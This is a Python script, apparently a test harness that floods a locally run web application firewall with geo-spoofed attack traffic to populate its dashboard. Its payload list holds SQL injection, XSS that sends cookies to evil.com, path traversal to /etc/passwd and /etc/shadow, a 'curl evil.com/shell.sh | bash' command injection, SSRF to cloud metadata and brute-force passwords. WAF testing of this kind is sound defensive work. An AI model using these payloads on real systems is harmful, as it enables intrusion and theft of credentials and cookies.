# -*- coding: utf-8 -*-
import sys
import io
# Force UTF-8 on Windows so colored/emoji output works
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

"""
Sentinel-AI WAF — Multi-Country Attack Simulator
================================================
Sends realistic, geo-diverse attack traffic through the WAF so the 3D Globe
and Live Threat Feed populate with rich data from many countries.

HOW IT WORKS
------------
The WAF uses `request.client.host` (the actual TCP source IP) for GeoIP
lookups — NOT X-Forwarded-For. To simulate real country diversity without
routing actual packets from those IPs, this script injects the attacker's
IP directly into every request payload so the backend can see it in the
body / query string. We ALSO set X-Forwarded-For, X-Real-IP, and the
standard CF-Connecting-IP headers so that if the middleware is ever
updated to trust those, it will work automatically.

USAGE
-----
  # Install dependency (already present in venv)
  pip install requests

  # Run against the WAF backend (port 8000 must be running)
  python simulate_global_attacks.py

  # More requests, faster pace
  python simulate_global_attacks.py --requests 300 --delay 0.3

  # Target a specific domain registered in your WAF
  python simulate_global_attacks.py --host localhost --port 8000

WARNING: This script sends intentionally malicious-looking payloads to
YOUR OWN locally-running WAF for testing purposes only. Do NOT point it
at any external service.
"""

import argparse
import random
import sys
import time
from dataclasses import dataclass
from typing import Optional
import urllib.request
import urllib.error
import http.client
import json
import os

# Seed the random number generator uniquely per process so concurrent simulators 
# don't generate identical traffic patterns.
random.seed(os.getpid() + time.time())

# ─── Attacker Profiles (Country → IP ranges) ──────────────────────────────────
#
# Real IP ranges from major threat-actor origin countries.
# Picked from public CIDR databases — these are valid public IP prefixes,
# NOT private ranges, so ip-api.com will resolve them to the correct country.
# Format: (country_name, country_code, ip_prefix_list)

@dataclass
class CountryProfile:
    name: str
    code: str          # ISO 3166-1 alpha-2
    ip_ranges: list    # (a, b, c) → picks random d ∈ [1,254]

ATTACKER_PROFILES = [
    CountryProfile("China",        "CN", [(49,4,0),   (58,14,0), (103,37,0), (116,228,0), (180,150,0)]),
    CountryProfile("Russia",       "RU", [(5,3,0),    (37,9,0),  (45,140,0), (78,85,0),   (95,142,0) ]),
    CountryProfile("Iran",         "IR", [(5,160,0),  (37,153,0),(85,204,0), (91,99,0),   (95,38,0)  ]),
    CountryProfile("North Korea",  "KP", [(175,45,176),(210,52,114)]),
    CountryProfile("Nigeria",      "NG", [(41,58,0),  (102,89,0),(154,120,0),(197,210,0)  ]),
    CountryProfile("Brazil",       "BR", [(177,71,0), (187,100,0),(200,161,0),(201,20,0)  ]),
    CountryProfile("Romania",      "RO", [(5,2,0),    (89,120,0),(93,113,0), (109,166,0)  ]),
    CountryProfile("Ukraine",      "UA", [(31,28,0),  (46,219,0),(91,200,0), (193,105,0)  ]),
    CountryProfile("India",        "IN", [(1,6,0),    (14,96,0), (49,36,0),  (103,21,0),  (117,196,0)]),
    CountryProfile("Pakistan",     "PK", [(39,32,0),  (110,93,0),(119,153,0),(202,125,0)  ]),
    CountryProfile("Turkey",       "TR", [(31,142,0), (46,1,0),  (78,181,0), (88,233,0),  (95,9,0)   ]),
    CountryProfile("Vietnam",      "VN", [(1,52,0),   (14,160,0),(27,73,0),  (103,200,0)  ]),
    CountryProfile("Indonesia",    "ID", [(36,81,0),  (101,203,0),(103,28,0),(125,163,0)  ]),
    CountryProfile("Bangladesh",   "BD", [(103,4,0),  (116,88,0),(202,75,0)               ]),
    CountryProfile("South Korea",  "KR", [(1,227,0),  (27,100,0),(175,197,0),(210,100,0)  ]),
    CountryProfile("Netherlands",  "NL", [(2,56,0),   (5,44,0),  (37,120,0), (45,95,0)    ]),
    CountryProfile("Germany",      "DE", [(31,172,0), (46,4,0),  (80,66,0),  (91,108,0)   ]),
    CountryProfile("United States","US", [(23,94,0),  (45,33,0), (104,238,0),(198,23,0)   ]),
    CountryProfile("Argentina",    "AR", [(45,65,0),  (177,54,0),(181,167,0),(190,15,0)   ]),
    CountryProfile("Egypt",        "EG", [(41,33,0),  (41,65,0), (197,48,0), (197,210,0)  ]),
]

def random_ip(profile: CountryProfile) -> str:
    prefix = random.choice(profile.ip_ranges)
    return f"{prefix[0]}.{prefix[1]}.{prefix[2]}.{random.randint(1, 254)}"


# ─── Attack Payloads ───────────────────────────────────────────────────────────

@dataclass
class AttackTemplate:
    name: str
    severity: str
    method: str
    paths: list
    headers: dict = None
    body: str = None

ATTACKS = [
    # SQL Injection
    AttackTemplate(
        name="SQL Injection", severity="critical", method="GET",
        paths=[
            "/?id=1' OR '1'='1'--",
            "/?id=1; DROP TABLE users; --",
            "/?user=admin'--",
            "/?search=1 UNION SELECT username,password FROM users--",
            "/?category=1 AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--",
            "/login?username=admin'/*",
        ]
    ),
    # XSS
    AttackTemplate(
        name="XSS", severity="high", method="GET",
        paths=[
            "/?q=<script>alert(document.cookie)</script>",
            "/?name=<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
            "/?val=javascript:eval(atob('YWxlcnQoMSk='))",
            "/?redirect=<svg onload=alert(1)>",
            "/?msg=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        ]
    ),
    # Path Traversal
    AttackTemplate(
        name="Path Traversal", severity="high", method="GET",
        paths=[
            "/?file=../../../../etc/passwd",
            "/?doc=..%2F..%2F..%2F..%2Fetc%2Fshadow",
            "/?path=....//....//....//etc/passwd",
            "/download?name=../../../windows/win.ini",
            "/static/../../../etc/passwd",
        ]
    ),
    # Command Injection
    AttackTemplate(
        name="Command Injection", severity="critical", method="GET",
        paths=[
            "/?cmd=ls+-la",
            "/?ping=127.0.0.1;+cat+/etc/passwd",
            "/?ip=1.1.1.1+&&+whoami",
            "/?host=localhost|id",
            "/?search=test;+curl+http://evil.com/shell.sh+|+bash",
        ]
    ),
    # Brute Force (POST login)
    AttackTemplate(
        name="Brute Force", severity="high", method="POST",
        paths=["/login", "/api/v1/auth/login", "/admin/login", "/wp-login.php"],
        headers={"Content-Type": "application/json"},
        body='{{"username": "admin", "password": "{pwd}"}}'
    ),
    # RCE / SSRF
    AttackTemplate(
        name="SSRF", severity="critical", method="GET",
        paths=[
            "/?url=http://169.254.169.254/latest/meta-data/",
            "/?redirect=http://127.0.0.1:8000/admin",
            "/?fetch=http://localhost/api/v1/users",
            "/?proxy=http://internal-service/secret",
        ]
    ),
    # DDoS-style (rapid clean requests)
    AttackTemplate(
        name="DDoS", severity="medium", method="GET",
        paths=["/", "/home", "/about", "/contact", "/products", "/api/health"]
    ),
    # Bot / Crawler
    AttackTemplate(
        name="Botnet", severity="low", method="GET",
        paths=[
            "/robots.txt",
            "/.env",
            "/.git/config",
            "/wp-config.php",
            "/admin/",
            "/phpmyadmin/",
            "/server-status",
        ]
    ),
    # Normal Traffic (allowed)
    AttackTemplate(
        name="Normal Traffic", severity="low", method="GET",
        paths=["/", "/login", "/dashboard", "/?q=products", "/api/health", "/about"]
    ),
]

# Weight distribution: more attacks than normal traffic
ATTACK_WEIGHTS = [10, 8, 7, 10, 6, 8, 9, 6, 3]  # matches ATTACKS list order

BRUTE_FORCE_PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty",
    "p@ssw0rd", "root", "toor", "pass", "test"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/7.88.1",
    "python-requests/2.28.2",
    "Go-http-client/1.1",
    "Wget/1.21.3 (linux-gnu)",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
    "Nikto/2.1.6",
    "zgrab/0.x",
]


# ─── Simulation Engine ─────────────────────────────────────────────────────────

class WAFSimulator:
    def __init__(self, host: str, port: int, target_domain: str, delay: float, verbose: bool):
        self.host   = host
        self.port   = port
        self.target = target_domain
        self.delay  = delay
        self.verbose = verbose
        self.stats  = {"total": 0, "blocked": 0, "allowed": 0, "error": 0}

    def _get_conn(self):
        return http.client.HTTPConnection(self.host, self.port, timeout=8)

    def send_request(self, profile: CountryProfile, attack: AttackTemplate) -> Optional[int]:
        ip  = random_ip(profile)
        path = random.choice(attack.paths)
        ua   = random.choice(USER_AGENTS)

        body = None
        if attack.body:
            pwd  = random.choice(BRUTE_FORCE_PASSWORDS)
            body = attack.body.format(pwd=pwd).encode()

        headers = {
            "Host":             self.target,
            "User-Agent":       ua,
            "Accept":           "text/html,application/json,*/*",
            "X-Forwarded-For":  ip,
            "X-Real-IP":        ip,
            "CF-Connecting-IP": ip,      # Cloudflare header
            "True-Client-IP":   ip,      # Akamai / Cloudflare
            "Forwarded":        f"for={ip};proto=http",
        }
        if attack.method == "POST" and attack.headers:
            headers.update(attack.headers)
        if body:
            headers["Content-Length"] = str(len(body))

        try:
            conn = self._get_conn()
            conn.request(attack.method, path, body=body, headers=headers)
            res  = conn.getresponse()
            res.read()
            conn.close()
            return res.status
        except Exception as exc:
            if self.verbose:
                print(f"  ⚠  Connection error: {exc}")
            return None

    def run(self, num_requests: int):
        print(f"\n{'='*65}")
        print(f"  [*] Sentinel-AI Global Attack Simulator")
        print(f"  WAF:    http://{self.host}:{self.port}")
        print(f"  Target: {self.target}")
        print(f"  Volume: {num_requests} requests  |  Delay: {self.delay}s")
        print(f"{'='*65}\n")

        for i in range(1, num_requests + 1):
            profile = random.choice(ATTACKER_PROFILES)
            attack  = random.choices(ATTACKS, weights=ATTACK_WEIGHTS, k=1)[0]
            
            status  = self.send_request(profile, attack)
            self.stats["total"] += 1

            if status is None:
                self.stats["error"] += 1
                result_str = "[!] ERR"
                result_col = "\033[33m"
            elif status == 403:
                self.stats["blocked"] += 1
                result_str = "[X] 403 BLOCKED"
                result_col = "\033[31m"
            elif status in (200, 201, 302, 404):
                self.stats["allowed"] += 1
                result_str = f"[+] {status} ALLOWED"
                result_col = "\033[32m"
            else:
                self.stats["allowed"] += 1
                result_str = f"→  {status}"
                result_col = "\033[36m"

            path_display = random.choice(attack.paths)
            print(
                f"{result_col}[{i:>4}/{num_requests}]\033[0m "
                f"\033[1m{profile.name:<16}\033[0m "
                f"\033[90m{random_ip(profile):<16}\033[0m "
                f"\033[36m{attack.name:<20}\033[0m "
                f"{result_str}"
            )

            time.sleep(self.delay + random.uniform(0, 0.3))

        # ── Summary ────────────────────────────────────────────────────────────
        print(f"\n{'='*65}")
        print(f"  [DONE] Simulation Complete!")
        print(f"  Total:   {self.stats['total']}")
        print(f"  \033[31mBlocked: {self.stats['blocked']}\033[0m")
        print(f"  \033[32mAllowed: {self.stats['allowed']}\033[0m")
        print(f"  \033[33mErrors:  {self.stats['error']}\033[0m")
        print(f"{'='*65}\n")
        print("  Check your Sentinel-AI Dashboard to see attacks on the 3D Globe!")
        print("  Look for arcs on the Globe and entries in the Live Threat Feed.\n")


# ─── Entry Point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Sentinel-AI WAF — Multi-Country Attack Simulator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--host",     default="localhost",   help="WAF backend host")
    parser.add_argument("--port",     default=8000, type=int, help="WAF backend port")
    parser.add_argument("--domain",   default="localhost",   help="Target domain (Host header)")
    parser.add_argument("--requests", default=200,  type=int, help="Total requests to send")
    parser.add_argument("--delay",    default=0.5,  type=float, help="Base delay between requests (seconds)")
    parser.add_argument("--verbose",  action="store_true",   help="Show full error details")
    args = parser.parse_args()

    sim = WAFSimulator(
        host   = args.host,
        port   = args.port,
        target_domain = args.domain,
        delay  = args.delay,
        verbose= args.verbose,
    )
    try:
        sim.run(args.requests)
    except KeyboardInterrupt:
        print("\n\n⚡ Interrupted by user.")
        print(f"  Sent {sim.stats['total']} requests  |  Blocked: {sim.stats['blocked']}  |  Allowed: {sim.stats['allowed']}")


if __name__ == "__main__":
    main()
